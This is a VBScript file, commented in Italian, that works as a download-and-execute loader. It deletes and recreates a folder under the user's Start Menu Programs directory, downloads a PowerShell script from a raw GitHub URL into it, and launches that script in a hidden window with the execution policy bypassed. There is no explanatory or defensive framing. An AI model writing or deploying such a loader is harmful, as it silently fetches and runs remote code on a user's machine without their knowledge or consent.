Dim url
Dim objHTTP
Dim objFSO
Dim strResponse
Dim outputFile
Dim folderPath
Dim filePath
Dim objShell

Set objNetwork = CreateObject("WScript.Network")
userName = objNetwork.UserName

url = "https://raw.githubusercontent.com/simonemichele05/PowershellProgetto/main/script.ps1"
folderPath = "C:\Users\" & userName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ScriptFolder"
filePath = folderPath & "\script.ps1"

' Elimino la cartella e i file aggiornati se esistono
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.FolderExists(folderPath) Then
    objFSO.DeleteFolder folderPath, True
End If

' Creo la cartella ScriptFolder
objFSO.CreateFolder(folderPath)

' Creo un oggetto XMLHTTP
Set objHTTP = CreateObject("MSXML2.XMLHTTP")

' Effettuo la richiesta GET per scaricare il contenuto della pagina
objHTTP.Open "GET", url, False
objHTTP.Send

' Salvo la risposta in una variabile
strResponse = objHTTP.ResponseText

' Scrivo il contenuto in un file nella cartella desiderata
Set outputFile = objFSO.CreateTextFile(filePath, True)
outputFile.Write strResponse
outputFile.Close

' Rilascio gli oggetti
Set objFSO = Nothing
Set objHTTP = Nothing

' Avvio il programma
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""C:\Users\" & userName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ScriptFolder\script.ps1""", 0
Set objShell = Nothing
